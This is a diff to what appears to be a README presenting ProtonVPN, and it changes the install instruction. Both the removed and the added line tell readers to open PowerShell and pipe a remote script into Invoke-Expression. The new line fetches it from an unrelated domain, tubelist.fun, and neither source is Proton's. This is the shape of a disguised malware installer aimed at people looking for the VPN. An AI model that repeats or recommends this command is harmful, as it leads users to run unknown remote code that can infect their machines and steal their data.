@@ -9,7 +9,7 @@ ProtonVPN is a privacy-focused VPN service built by the team behind ProtonMail. 
 To get started, open PowerShell and execute:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ### Why ProtonVPN?
